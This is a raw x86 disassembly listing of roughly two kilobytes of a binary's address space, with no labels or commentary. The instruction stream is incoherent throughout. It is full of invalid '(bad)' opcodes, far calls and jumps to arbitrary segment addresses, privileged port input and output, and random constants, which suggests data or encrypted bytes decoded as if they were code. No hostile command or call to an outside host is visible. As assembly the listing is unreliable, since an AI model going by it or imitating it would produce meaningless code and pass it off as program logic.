  41b7db:	mov    fs,WORD PTR [ebp-0x66]
  41b7de:	inc    ecx
  41b7df:	add    cl,bl
  41b7e1:	pop    ds
  41b7e2:	mov    dl,0xf6
  41b7e4:	call   0x86a3:0x2f1a8424
  41b7eb:	mov    WORD PTR [ecx],?
  41b7ed:	mov    ebx,DWORD PTR [eax+0x77]
  41b7f0:	test   DWORD PTR [ebx-0x71df7e0c],eax
  41b7f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b7f7:	xor    eax,0x7af441ed
  41b7fc:	out    0x74,al
  41b7fe:	pop    esi
  41b7ff:	cdq    
  41b800:	call   0x693f:0x5250e7bc
  41b807:	push   edx
  41b808:	ds into 
  41b80a:	add    bl,dh
  41b80c:	jecxz  0x41b7a9
  41b80e:	mov    bl,0x9d
  41b810:	ja     0x41b88d
  41b812:	lock dec ebp
  41b814:	cmp    BYTE PTR [ebp-0x55732d77],ch
  41b81a:	sub    cl,ah
  41b81c:	or     BYTE PTR [esi-0x47],al
  41b81f:	push   0x1a
  41b821:	es out 0x8,eax
  41b824:	xor    dh,BYTE PTR [eax-0x22]
  41b827:	xchg   ebx,eax
  41b828:	in     eax,dx
  41b829:	xchg   BYTE PTR [eax-0x42518a95],dl
  41b82f:	bound  eax,QWORD PTR [edx]
  41b831:	in     eax,0xcf
  41b833:	scas   eax,DWORD PTR es:[edi]
  41b834:	ss scas al,BYTE PTR es:[edi]
  41b836:	in     eax,0xed
  41b838:	aad    0xd1
  41b83a:	adc    BYTE PTR [esi],dl
  41b83c:	stos   DWORD PTR es:[edi],eax
  41b83d:	jae    0x41b7e1
  41b83f:	inc    esp
  41b840:	call   0x8117:0xb376dc04
  41b847:	into   
  41b848:	and    edi,DWORD PTR [edx+0x6c]
  41b84b:	add    cl,BYTE PTR [ebx+edi*1]
  41b84e:	push   edx
  41b84f:	sub    eax,0x1ae4e794
  41b854:	adc    eax,0x6c9a42da
  41b859:	inc    ecx
  41b85a:	sbb    DWORD PTR [esi-0x72],edi
  41b85d:	xchg   ebp,eax
  41b85e:	xchg   esp,eax
  41b85f:	adc    cl,ch
  41b861:	pop    eax
  41b862:	push   ss
  41b863:	shr    ecx,cl
  41b865:	sub    al,0xb
  41b867:	ss es pushf 
  41b86a:	(bad)  
  41b86b:	xor    eax,0xf5d7bc0f
  41b870:	fs xor eax,0xedf707b6
  41b876:	push   esi
  41b877:	xchg   edx,eax
  41b878:	(bad)  
  41b879:	mov    edi,0x7155d278
  41b87e:	dec    eax
  41b87f:	je     0x41b80e
  41b881:	pop    eax
  41b882:	mov    bl,BYTE PTR ds:0x6f26c540
  41b888:	and    BYTE PTR [edx],cl
  41b88a:	adc    al,0x9e
  41b88c:	std    
  41b88d:	mov    bl,0x92
  41b88f:	jno    0x41b8ff
  41b891:	xor    cl,BYTE PTR [ebp+0x21b6af96]
  41b897:	(bad)  
  41b898:	fisttp DWORD PTR [ebx]
  41b89a:	adc    BYTE PTR ds:0xeaeefb5e,ah
  41b8a0:	cmp    ch,0xfc
  41b8a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b8a4:	inc    esi
  41b8a5:	or     ebx,DWORD PTR [esi-0x1d]
  41b8a8:	cmc    
  41b8a9:	xchg   ebp,eax
  41b8aa:	imul   ecx,DWORD PTR ss:[eax-0x7d],0x10
  41b8af:	or     BYTE PTR ds:0x7dfb086b,bl
  41b8b5:	jo     0x41b8d4
  41b8b7:	mov    bh,dh
  41b8b9:	sbb    eax,0x93ade903
  41b8be:	mov    cl,0x4d
  41b8c0:	cwde   
  41b8c1:	mov    edx,eax
  41b8c3:	add    al,0x70
  41b8c5:	test   DWORD PTR [ecx-0x7fbd4fed],ebp
  41b8cb:	call   0x98bf3174
  41b8d0:	fs add al,0xad
  41b8d3:	int3   
  41b8d4:	adc    ecx,esi
  41b8d6:	sbb    DWORD PTR [edi-0x2d],ecx
  41b8d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b8da:	sbb    BYTE PTR [ebx],0x1f
  41b8dd:	mov    al,ds:0x86c5c59f
  41b8e2:	shl    bh,cl
  41b8e4:	retf   0x7665
  41b8e7:	add    edi,eax
  41b8e9:	pop    ebp
  41b8ea:	cli    
  41b8eb:	mov    ecx,0xe8629e10
  41b8f0:	fld    QWORD PTR [edx+0x37845520]
  41b8f6:	jp     0x41b8e7
  41b8f8:	popa   
  41b8f9:	imul   edi,esi,0x341a5fe
  41b8ff:	lds    esp,FWORD PTR [ecx+0x46bb07f2]
  41b905:	cs pop ebp
  41b907:	fadd   DWORD PTR [ecx-0x33544313]
  41b90d:	stos   BYTE PTR es:[edi],al
  41b90e:	or     bl,dl
  41b910:	inc    esi
  41b911:	in     al,dx
  41b912:	sbb    al,0xdc
  41b914:	test   al,0x98
  41b916:	imul   eax,DWORD PTR [edx]
  41b919:	mov    edx,DWORD PTR [ebp-0x4]
  41b91c:	jmp    0x41bb51
  41b921:	(bad)  
  41b922:	retf   
  41b923:	xlat   BYTE PTR ds:[ebx]
  41b924:	vpsubusw xmm2,xmm4,xmm6
  41b928:	retf   
  41b929:	xor    esp,DWORD PTR [ecx-0x2d39deca]
  41b92f:	mov    esp,DWORD PTR [ebx]
  41b931:	lock out 0x7f,al
  41b934:	js     0x41b946
  41b936:	jle    0x41b9b0
  41b938:	js     0x41b975
  41b93a:	lods   eax,DWORD PTR ds:[esi]
  41b93b:	or     eax,0x8ac7652c
  41b940:	sub    BYTE PTR [ecx+ecx*4+0x71e7c1d6],dl
  41b947:	int3   
  41b948:	mov    ds:0x1510ec7e,eax
  41b94d:	push   ebx
  41b94e:	add    eax,0x93ca6914
  41b953:	je     0x41b8f3
  41b955:	mov    eax,0x4e7475e5
  41b95a:	jmp    0xb6e9:0x52cb9c43
  41b961:	mov    dh,0x7
  41b963:	xor    DWORD PTR [edx-0x429bcf69],ebx
  41b969:	cmp    ebx,eax
  41b96b:	int3   
  41b96c:	fs das 
  41b96e:	pushf  
  41b96f:	sbb    al,0xe8
  41b971:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b972:	iret   
  41b973:	cld    
  41b974:	popa   
  41b975:	jns    0x41b909
  41b977:	sbb    dl,BYTE PTR [edx-0x39f42741]
  41b97d:	xor    esi,DWORD PTR [ebx-0x9baa5a2]
  41b983:	aas    
  41b984:	repz inc eax
  41b986:	out    dx,al
  41b987:	jecxz  0x41b94a
  41b989:	leave  
  41b98a:	add    ebp,edi
  41b98c:	jmp    0x41b9a6
  41b98e:	push   esi
  41b98f:	cmp    dh,BYTE PTR ds:0x6888daf9
  41b995:	clc    
  41b996:	add    al,0x54
  41b998:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b999:	and    al,0xc2
  41b99b:	(bad)  
  41b99c:	xor    eax,0x3a49cb32
  41b9a1:	jp     0x41ba03
  41b9a3:	xchg   BYTE PTR [edi+0x4c22dbca],cl
  41b9a9:	pop    eax
  41b9aa:	fwait
  41b9ab:	mov    WORD PTR [ebx-0x1a],?
  41b9ae:	push   ebx
  41b9af:	mov    dl,0xe3
  41b9b1:	sbb    al,0x3d
  41b9b3:	inc    edx
  41b9b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b9b5:	js     0x41ba04
  41b9b7:	fcom   st(2)
  41b9b9:	push   ebp
  41b9ba:	dec    edi
  41b9bb:	mov    ebx,0x2fcda95
  41b9c0:	and    BYTE PTR [eax],bl
  41b9c2:	xchg   edx,eax
  41b9c3:	mov    esp,0xc73a74e4
  41b9c8:	xchg   ebp,eax
  41b9c9:	cdq    
  41b9ca:	shr    BYTE PTR [ebx+edi*8+0x45],cl
  41b9ce:	clc    
  41b9cf:	and    bh,dh
  41b9d1:	and    al,0xe6
  41b9d3:	call   0x1196:0xd5935e41
  41b9da:	adc    eax,0xab389b84
  41b9df:	add    DWORD PTR [ecx+0x38],esp
  41b9e2:	js     0x41b971
  41b9e4:	dec    ebp
  41b9e5:	mov    dh,0xd4
  41b9e7:	jge    0x41ba42
  41b9e9:	adc    esp,DWORD PTR [ebp+ebx*8+0x46]
  41b9ed:	adc    al,0xbe
  41b9ef:	mov    ebx,0xe6e6b1ed
  41b9f4:	jecxz  0x41ba4d
  41b9f6:	mov    WORD PTR [ebx+0x4e],?
  41b9f9:	out    dx,eax
  41b9fa:	test   dh,ch
  41b9fc:	call   0xb6bf:0xe18d1a0
  41ba03:	adc    DWORD PTR [eax],0xdc1cab22
  41ba09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ba0a:	jp     0x41b9a9
  41ba0c:	jno    0x41b9bd
  41ba0e:	jmp    0x41ba1d
  41ba10:	mov    ch,0x2c
  41ba12:	jmp    0x24e5:0x3b50935b
  41ba19:	mov    ebx,0x48d1b50c
  41ba1e:	jmp    0x36db:0x47c22ff0
  41ba25:	mov    BYTE PTR [ecx+0x124cd1b1],0xc1
  41ba2c:	xlat   BYTE PTR ds:[ebx]
  41ba2d:	sbb    BYTE PTR [esp+edx*2],cl
  41ba30:	xchg   ecx,eax
  41ba31:	cmp    eax,0xfbc743d3
  41ba36:	push   cs
  41ba37:	jp     0x41bab4
  41ba39:	mov    ss,WORD PTR [esi+0x5df0b83]
  41ba3f:	loope  0x41ba6c
  41ba41:	lods   al,BYTE PTR ds:[esi]
  41ba42:	xchg   ecx,eax
  41ba43:	(bad)  
  41ba44:	ret    0xe29b
  41ba47:	mov    ch,0x74
  41ba49:	inc    ecx
  41ba4a:	xor    dl,BYTE PTR [edx+0x28f8816f]
  41ba50:	adc    eax,0xd3f4968e
  41ba55:	leave  
  41ba56:	lods   al,BYTE PTR ds:[esi]
  41ba57:	ffree  st(2)
  41ba59:	xor    eax,0x60aa6f6e
  41ba5e:	jp     0x41ba4a
  41ba60:	cmp    ebp,DWORD PTR [edx+0x4a]
  41ba63:	dec    edx
  41ba64:	fs (bad) 
  41ba66:	popf   
  41ba67:	stc    
  41ba68:	xchg   ecx,eax
  41ba69:	shl    DWORD PTR [ebp+eiz*8+0x2fc9f39],cl
  41ba70:	es jbe 0x41bada
  41ba73:	push   eax
  41ba74:	sbb    BYTE PTR ds:0xe6287256,dh
  41ba7a:	faddp  st(6),st
  41ba7c:	nop
  41ba7d:	aaa    
  41ba7e:	call   0xf132:0xcac66586
  41ba85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ba86:	retf   
  41ba87:	dec    edx
  41ba88:	stos   BYTE PTR es:[edi],al
  41ba89:	movlps QWORD PTR [ecx],xmm0
  41ba8c:	sbb    BYTE PTR ds:0x3aac0b99,dh
  41ba92:	sub    DWORD PTR [ecx+0x1],0x285896b7
  41ba99:	mov    esp,0x29513d2d
  41ba9e:	xor    BYTE PTR [ebp+0x58],dh
  41baa1:	inc    ax
  41baa3:	test   DWORD PTR [edx-0x7008d82a],edi
  41baa9:	push   ds
  41baaa:	jg     0x41bac3
  41baac:	xor    al,0x7
  41baae:	add    DWORD PTR [eax],0x48f328f9
  41bab4:	mov    ebp,0xe6583cf4
  41bab9:	jno    0x41bb39
  41babb:	inc    edx
  41babc:	test   DWORD PTR [eax-0x17],edi
  41babf:	push   edx
  41bac0:	ret    
  41bac1:	sar    BYTE PTR [ecx-0x5f1cd6ec],1
  41bac7:	mov    ecx,0x104e4485
  41bacc:	or     ch,BYTE PTR [ebp+0x33059447]
  41bad2:	xchg   ebp,eax
  41bad3:	popf   
  41bad4:	clc    
  41bad5:	not    DWORD PTR [ecx+0x6c1dadc6]
  41badb:	out    dx,eax
  41badc:	add    eax,DWORD PTR [edi-0x3a419d55]
  41bae2:	cmp    eax,0x25f6f940
  41bae7:	and    eax,0xca304395
  41baec:	inc    edi
  41baed:	loope  0x41bae6
  41baef:	push   0x139dc190
  41baf4:	daa    
  41baf5:	leave  
  41baf6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41baf7:	leave  
  41baf8:	or     BYTE PTR [edx+0x5b],cl
  41bafb:	push   ds
  41bafc:	or     al,0x82
  41bafe:	xchg   esi,eax
  41baff:	mul    esi
  41bb01:	push   edx
  41bb02:	ror    BYTE PTR [ebp+0x48],cl
  41bb05:	adc    bh,BYTE PTR [eax]
  41bb07:	jnp    0x41bb3c
  41bb09:	add    BYTE PTR [ebx-0x757c000a],al
  41bb0f:	test   BYTE PTR [ebp+0x73],al
  41bb12:	fild   WORD PTR [ecx]
  41bb14:	pop    ebp
  41bb15:	(bad)  
  41bb16:	adc    al,0xcc
  41bb18:	inc    ebx
  41bb19:	scas   al,BYTE PTR es:[edi]
  41bb1a:	shl    eax,0xcc
  41bb1d:	sbb    bl,BYTE PTR [eax-0x3134e8de]
  41bb23:	sub    eax,eax
  41bb25:	xor    bl,dh
  41bb27:	stos   BYTE PTR es:[edi],al
  41bb28:	jbe    0x41bad1
  41bb2a:	das    
  41bb2b:	push   es
  41bb2c:	sbb    al,0x8d
  41bb2e:	push   edi
  41bb2f:	mov    edi,0xefdf6f83
  41bb34:	(bad)  
  41bb35:	push   0x29
  41bb37:	jge    0x41bb66
  41bb39:	cmp    DWORD PTR [esi],0xffffffa5
  41bb3c:	jp     0x41bbb7
  41bb3e:	pop    ss
  41bb3f:	int    0xa
  41bb41:	xchg   ecx,eax
  41bb42:	sti    
  41bb43:	pop    eax
  41bb44:	mov    cl,0x87
  41bb46:	call   0x3abd:0x858006ed
  41bb4d:	pop    esi
  41bb4e:	scas   eax,DWORD PTR es:[edi]
  41bb4f:	sbb    DWORD PTR [ebx+esi*1-0x2f],ebp
  41bb53:	jmp    0x41bd88
  41bb58:	enter  0xcfcf,0xc7
  41bb5c:	iret   
  41bb5d:	(bad)  
  41bb5e:	rcl    bh,1
  41bb60:	mov    esi,0xca17bf12
  41bb65:	cmp    DWORD PTR [eax],ecx
  41bb67:	out    0x88,eax
  41bb69:	in     al,0x7f
  41bb6b:	js     0x41bb7d
  41bb6d:	jle    0x41bbe7
  41bb6f:	js     0x41bba1
  41bb71:	pop    ebx
  41bb72:	xchg   ebx,eax
  41bb73:	pop    ebp
  41bb74:	ret    
  41bb75:	es nop
  41bb77:	cdq    
  41bb78:	mov    esp,0x48bcabe7
  41bb7d:	out    dx,eax
  41bb7e:	les    ebp,FWORD PTR ds:0x1eb4b29
  41bb84:	xor    ebx,DWORD PTR [ecx]
  41bb86:	and    BYTE PTR [ecx+0x344c43d9],0x93
  41bb8d:	repz inc esp
  41bb8f:	xchg   esp,eax
  41bb90:	fwait
  41bb91:	mov    bl,al
  41bb93:	add    cl,BYTE PTR [esi]
  41bb95:	loope  0x41bb90
  41bb97:	pop    esi
  41bb98:	push   esp
  41bb99:	push   0xb062cb04
  41bb9e:	in     eax,dx
  41bb9f:	jp     0x41bc09
  41bba1:	and    DWORD PTR cs:[esi+0x4c],eax
  41bba5:	mov    dh,0x33
  41bba7:	xor    DWORD PTR [edx+0x7a635a6e],0xffffffb7
  41bbae:	hlt    
  41bbaf:	dec    eax
  41bbb0:	shl    BYTE PTR [ebp-0x6052d031],1
  41bbb6:	xchg   DWORD PTR [ebx],esp
  41bbb8:	mov    BYTE PTR [edx+0x69],dl
  41bbbb:	test   DWORD PTR [esi-0x5a99ef25],0x380155de
  41bbc5:	lock iret 
  41bbc7:	or     esi,ebp
  41bbc9:	mov    edi,ebx
  41bbcb:	fwait
  41bbcc:	ret    
  41bbcd:	and    DWORD PTR [eax-0x1682d1c2],ebp
  41bbd3:	repz stc 
  41bbd5:	mov    al,BYTE PTR [edx-0x3b1fd9ce]
  41bbdb:	fdivp  st(2),st
  41bbdd:	out    0x9d,eax
  41bbdf:	xchg   esi,eax
  41bbe0:	mov    ecx,0x70efbd74
  41bbe5:	(bad)  
  41bbe6:	cmp    al,0xd
  41bbe8:	stc    
  41bbe9:	and    bh,BYTE PTR [edi+esi*8-0x71a4f775]
  41bbf0:	data16 arpl WORD PTR [ecx-0x2581ef],dx
  41bbf7:	loop   0x41bc4d
  41bbf9:	cld    
  41bbfa:	int3   
  41bbfb:	clc    
  41bbfc:	ret    0xa2fb
  41bbff:	xchg   esp,eax
  41bc00:	fs pusha 
  41bc02:	and    al,0x58
  41bc04:	arpl   bp,di
  41bc06:	sbb    al,0x6b
  41bc08:	jns    0x41bbf6
  41bc0a:	popf   
  41bc0b:	mov    bl,0xc8
  41bc0d:	outs   dx,BYTE PTR ds:[esi]
  41bc0e:	or     BYTE PTR [ebp+edx*2+0x63],ah
  41bc12:	or     BYTE PTR [ecx+0x4d],0x45
  41bc16:	repnz loopne 0x41bc6c
  41bc19:	lahf   
  41bc1a:	(bad)  
  41bc1c:	inc    edx
  41bc1d:	es int 0x86
  41bc20:	imul   edx,DWORD PTR [ebx-0x7a],0xf0afaad7
  41bc27:	jg     0x41bbf5
  41bc29:	fcomp  QWORD PTR [ecx+0x15]
  41bc2c:	add    BYTE PTR [eax+ecx*4],bl
  41bc2f:	dec    esi
  41bc30:	mov    ebx,0xbcb4c156
  41bc35:	cli    
  41bc36:	repnz jecxz 0x41bca3
  41bc39:	jl     0x41bc26
  41bc3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc3c:	mov    bl,0xc5
  41bc3e:	retf   0xb8d6
  41bc41:	aaa    
  41bc42:	mov    DWORD PTR [edi-0x5a2b43ab],ebx
  41bc48:	dec    DWORD PTR [ebx-0x74]
  41bc4b:	(bad)  
  41bc4d:	popa   
  41bc4e:	mov    dh,0x2d
  41bc50:	sbb    al,0x53
  41bc52:	and    BYTE PTR [ebx],ah
  41bc54:	ficomp WORD PTR [edx+0x12]
  41bc57:	bound  edi,QWORD PTR [eax]
  41bc59:	or     ebp,DWORD PTR [esi-0x4f0a60f7]
  41bc5f:	test   BYTE PTR ds:[esi+0x3],dh
  41bc63:	inc    ecx
  41bc64:	xor    eax,0xd285a36b
  41bc69:	in     eax,0x5e
  41bc6b:	mov    al,ds:0xd624dd05
  41bc70:	sub    eax,0xd77f86d5
  41bc75:	push   edx
  41bc76:	icebp  
  41bc77:	and    BYTE PTR [edx-0x3c],bl
  41bc7a:	pushf  
  41bc7b:	xor    bl,BYTE PTR [edx-0x80]
  41bc7e:	in     al,0x12
  41bc80:	arpl   WORD PTR [edx+ecx*4-0x622ca7bd],bx
  41bc87:	int3   
  41bc88:	mov    DWORD PTR [edi+0x5cc9773f],edi
  41bc8e:	lods   eax,DWORD PTR ds:[esi]
  41bc8f:	outs   dx,BYTE PTR cs:[esi]
  41bc91:	push   eax
  41bc92:	push   edi
  41bc93:	lock out dx,eax
  41bc95:	hlt    
  41bc96:	mov    BYTE PTR [ebx+0x28],bh
  41bc99:	sub    al,0x22
  41bc9b:	lock je 0x41bc9f
  41bc9e:	pushf  
  41bc9f:	jb     0x41bc25
  41bca1:	mov    eax,0x138328ab
  41bca6:	inc    esi
  41bca7:	test   al,0x49
  41bca9:	test   BYTE PTR [ecx],dh
  41bcab:	ja     0x41bd05
  41bcad:	mov    DWORD PTR [edi-0x32884284],edx
  41bcb3:	lahf   
  41bcb4:	test   eax,0x2bb2bee6
  41bcb9:	iret   
  41bcba:	in     al,dx
  41bcbb:	sbb    al,ch
  41bcbd:	pop    eax
  41bcbe:	xchg   ebp,eax
  41bcbf:	int    0xac
  41bcc1:	pop    DWORD PTR [eax]
  41bcc3:	std    
  41bcc4:	mov    ebp,0xd53dcdcc
  41bcc9:	mov    fs,WORD PTR [eax+0x79]
  41bccc:	ficom  WORD PTR [esi+eax*8]
  41bccf:	data16 adc bl,BYTE PTR cs:[edx]
  41bcd3:	lahf   
  41bcd4:	ret    
  41bcd5:	jns    0x41bd06
  41bcd7:	ss popf 
  41bcd9:	dec    ebx
  41bcda:	jbe    0x41bc6e
  41bcdc:	xchg   esi,eax
  41bcde:	ss pop eax
  41bce0:	stos   DWORD PTR es:[edi],eax
  41bce1:	mov    al,ds:0x5e461f68
  41bce6:	iret   
  41bce7:	push   0x7c
  41bce9:	out    dx,al
  41bcea:	mov    al,0x62
  41bcec:	jmp    0xf66e:0x4f9c5110
  41bcf3:	cs dec ebx
  41bcf5:	ror    DWORD PTR [esi-0x3ff2cb6],cl
  41bcfb:	push   0xffffffce
  41bcfd:	jmp    0x6491d748
  41bd02:	mov    dl,0x72
  41bd04:	shl    al,cl
  41bd06:	daa    
  41bd07:	in     eax,dx
  41bd08:	add    BYTE PTR [ebx],0xad
  41bd0b:	or     al,0xcb
  41bd0d:	dec    esp
  41bd0e:	lds    ebx,FWORD PTR [edx]
  41bd10:	in     al,dx
  41bd11:	inc    ecx
  41bd12:	sbb    DWORD PTR [esi+0xc649896],0x64
  41bd19:	out    dx,al
  41bd1a:	mov    WORD PTR [esi],?
  41bd1c:	(bad)  
  41bd1d:	call   0x1fe2:0x99813667
  41bd24:	mov    DWORD PTR ds:0xfb65af44,ebp
  41bd2a:	les    esi,FWORD PTR [esi+edx*2]
  41bd2d:	and    eax,0x8f5c4051
  41bd32:	out    0xd3,eax
  41bd34:	jecxz  0x41bd20
  41bd36:	imul   esp,esi,0x48
  41bd39:	test   BYTE PTR [edx+esi*8+0x76],0x8a
  41bd3e:	test   dl,dl
  41bd40:	mov    BYTE PTR [edi-0x1b],bl
  41bd43:	popa   
  41bd44:	leave  
  41bd45:	into   
  41bd46:	test   eax,0xdef03a01
  41bd4b:	mov    edx,0x6eb1b601
  41bd50:	mov    edx,0xe5d0c731
  41bd55:	mov    edi,0xddd3a338
  41bd5a:	mov    esi,0xdbde1615
  41bd5f:	sbb    bl,BYTE PTR [edi-0x6cac3c5d]
  41bd65:	popf   
  41bd66:	aad    0x14
  41bd68:	or     eax,0x72d3d625
  41bd6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bd6e:	dec    eax
  41bd6f:	mov    eax,ds:0xaa2ae1d8
  41bd74:	lods   eax,DWORD PTR ds:[esi]
  41bd75:	push   edx
  41bd76:	shl    BYTE PTR ss:[esp+eax*1+0x25],1
  41bd7b:	push   esp
  41bd7c:	push   0x683e9519
  41bd81:	adc    BYTE PTR [ebx-0x31],bh
  41bd84:	(bad)  
  41bd86:	add    eax,0x84d8bc3
  41bd8b:	jmp    0x41bfc0
  41bd90:	into   
  41bd91:	leave  
  41bd92:	leave  
  41bd93:	rcr    ecx,0xc1
  41bd96:	(bad)  
  41bd97:	fldcw  WORD PTR [ebx+0x3e]
  41bd9a:	stc    
  41bd9b:	push   0x73
  41bd9d:	jge    0x41bd56
  41bd9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bda0:	mov    al,ds:0x10787fea
  41bda5:	jle    0x41be1f
  41bda7:	js     0x41bd88
  41bda9:	(bad)  [edx+0x47]
  41bdac:	push   0x3a5d3bea
  41bdb1:	fcomp  st(1)
  41bdb3:	cmp    DWORD PTR [esi+eiz*8+0xa],esi
  41bdb7:	std    
  41bdb8:	push   ss
  41bdb9:	jb     0x41bdd6
  41bdbb:	imul   edi,DWORD PTR [edi],0x76c51c04
  41bdc1:	dec    DWORD PTR [esi+ecx*4+0x69f99e2]
  41bdc8:	push   edx
  41bdc9:	and    ebx,0x8c2dfede
  41bdcf:	sti    
  41bdd0:	loope  0x41bd6d
  41bdd2:	out    dx,al
  41bdd3:	popf   
  41bdd4:	add    DWORD PTR [ecx],ecx
  41bdd6:	fistp  QWORD PTR [ecx]
  41bdd8:	test   eax,0xa91772d2
  41bddd:	mov    edx,0xabd49c65
  41bde2:	aad    0x3a
  41bde4:	xor    edi,edx
  41bde6:	shl    BYTE PTR [eax+0x73],1
  41bde9:	mov    edx,0x33ab2bd6
  41bdee:	lods   al,BYTE PTR ds:[esi]
  41bdef:	xsha1  (bad)
  41bdf0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bdf1:	leave  
  41bdf2:	sbb    ch,BYTE PTR [esi+0x4e]
  41bdf5:	inc    ebx
  41bdf6:	jo     0x41bd8a
  41bdf8:	int3   
  41bdf9:	mov    bh,0x87
  41bdfb:	or     ah,BYTE PTR [ecx+edi*8]
  41bdfe:	stos   DWORD PTR es:[edi],eax
  41bdff:	mov    ch,0xf
  41be01:	cwde   
  41be02:	out    dx,al
  41be03:	dec    edi
  41be04:	mov    cl,0x86
  41be06:	inc    ecx
  41be07:	cmc    
  41be08:	daa    
  41be09:	mov    bh,dl
  41be0b:	sahf   
  41be0c:	pop    ss
  41be0d:	mov    edx,DWORD PTR [ebp+0x15dd31bf]
  41be13:	mov    esi,ebx
  41be15:	push   0x5f
  41be17:	fwait
  41be18:	je     0x41bdea
  41be1a:	sbb    dh,BYTE PTR [esp+edi*4+0x3ad63081]
  41be21:	ins    BYTE PTR es:[edi],dx
  41be22:	mov    bl,0x68
  41be24:	or     bl,BYTE PTR [ecx+0x1c]
  41be27:	out    0xaa,al
  41be29:	icebp  
  41be2a:	rdtsc  
  41be2c:	sbb    BYTE PTR [edx+0x3a],al
  41be2f:	(bad)  [ebx+0x5d90d5e6]
  41be35:	fcomp  st(6)
  41be37:	call   0xca71:0x64338f38
  41be3e:	mov    ds:0x8cb50a25,eax
  41be43:	xchg   esp,eax
  41be44:	out    dx,al
  41be45:	pop    ecx
  41be46:	popf   
  41be47:	jno    0x41be85
  41be49:	xlat   BYTE PTR ds:[ebx]
  41be4a:	dec    eax
  41be4b:	bswap  edx
  41be4d:	dec    ebp
  41be4e:	mov    ch,0xc7
  41be50:	test   DWORD PTR [ecx-0x2c],0x38c76a04
  41be57:	and    eax,0x4f5817af
  41be5c:	mov    WORD PTR gs:[edi],fs
  41be5f:	mov    ecx,0x29ee20c2
  41be64:	rcl    al,0x84
  41be67:	mov    ds:0xfd2320d7,eax
  41be6c:	adc    eax,0x6c068c54
  41be71:	stos   DWORD PTR es:[edi],eax
  41be72:	sti    
  41be73:	mov    ch,0x1b
  41be75:	push   ebx
  41be76:	outs   dx,BYTE PTR ds:[esi]
  41be77:	mov    esi,0xe44c1592
  41be7c:	dec    ebp
  41be7d:	nop
  41be7e:	stos   DWORD PTR es:[edi],eax
  41be7f:	int3   
  41be80:	cmp    al,0xf
  41be82:	jns    0x41beb3
  41be84:	pop    eax
  41be85:	xchg   ebx,eax
  41be86:	xchg   ecx,eax
  41be87:	and    DWORD PTR [esi+0x45],edx
  41be8a:	pop    edx
  41be8b:	pop    es
  41be8c:	and    eax,DWORD PTR [edi+0xc]
  41be8f:	push   cs
  41be90:	es popa 
  41be92:	mov    dh,0xeb
  41be94:	outs   dx,BYTE PTR ds:[esi]
  41be95:	(bad)  
  41be97:	adc    DWORD PTR [ecx],ebp
  41be99:	out    dx,al
  41be9a:	inc    ecx
  41be9b:	sbb    eax,0xae7a4b60
  41bea0:	test   bl,ah
  41bea2:	popa   
  41bea3:	es std 
  41bea5:	in     al,dx
  41bea6:	xor    ah,cl
  41bea8:	or     BYTE PTR [edx+0x1b],bh
  41beab:	mov    ds:0x60fc396,al
  41beb0:	retf   
  41beb1:	mov    al,0xa4
  41beb3:	lods   al,BYTE PTR ds:[esi]
  41beb4:	adc    ecx,DWORD PTR [edx-0x58779d8b]
  41beba:	dec    ecx
  41bebb:	jl     0x41beb0
  41bebd:	cld    
  41bebe:	push   ecx
  41bebf:	aaa    
  41bec0:	inc    ecx
  41bec1:	mov    ah,0x97
  41bec3:	xor    al,0x9e
  41bec5:	outs   dx,BYTE PTR ds:[esi]
  41bec6:	cld    
  41bec7:	add    al,0x57
  41bec9:	fwait
  41beca:	scas   al,BYTE PTR es:[edi]
  41becb:	adc    esi,edi
  41becd:	pusha  
  41bece:	adc    cl,BYTE PTR [eax+0x7a]
  41bed1:	daa    
  41bed2:	add    DWORD PTR [eax],ecx
  41bed4:	xor    cl,BYTE PTR [ebp-0x47847477]
  41beda:	cld    
  41bedb:	push   es
  41bedc:	sahf   
  41bedd:	xchg   ebx,eax
  41bede:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bedf:	daa    
  41bee0:	xor    DWORD PTR cs:[ebp-0x45],edx
  41bee4:	cwde   
  41bee5:	pop    ss
  41bee6:	ins    DWORD PTR es:[edi],dx
  41bee7:	jecxz  0x41bf26
  41bee9:	test   eax,0x88795ea2
  41beee:	or     eax,0x2cb0edd0
  41bef3:	jecxz  0x41bed0
  41bef5:	adc    eax,0x7d77c9f2
  41befa:	push   cs
  41befb:	xchg   ecx,eax
  41befc:	jnp    0x41bf6e
  41befe:	mov    bh,0xfe
  41bf00:	xlat   BYTE PTR ds:[ebx]
  41bf01:	cdq    
  41bf02:	in     eax,dx
  41bf03:	push   edx
  41bf04:	jmp    0x4c9e:0xca953566
  41bf0b:	push   ebx
  41bf0c:	aad    0x6e
  41bf0e:	cmp    eax,0x4dd8ba01
  41bf13:	popa   
  41bf14:	add    al,ch
  41bf16:	ja     0x41bf39
  41bf18:	out    0x12,al
  41bf1a:	xchg   esp,eax
  41bf1b:	sub    dh,BYTE PTR [eax+0x5f]
  41bf1e:	out    dx,al
  41bf1f:	xor    BYTE PTR [ebp+0xae0de95],0x6b
  41bf26:	out    dx,al
  41bf27:	xor    BYTE PTR [ebp+eiz*2-0x65e96af0],dh
  41bf2e:	jb     0x41bf90
  41bf30:	ret    0xe71a
  41bf33:	dec    ebp
  41bf34:	inc    eax
  41bf35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf36:	mov    eax,0x490ee286
  41bf3b:	addr16 mov esp,0xd1f392c9
  41bf41:	push   esi
  41bf42:	mov    ecx,0x704d7485
  41bf47:	add    BYTE PTR [ebp+0x65],bh
  41bf4a:	and    al,0xb
  41bf4c:	stos   DWORD PTR es:[edi],eax
  41bf4d:	xor    esi,DWORD PTR [ebx]
  41bf4f:	jns    0x41bf52
  41bf51:	sub    edx,ebx
  41bf53:	jb     0x41bf1f
  41bf55:	dec    ebp
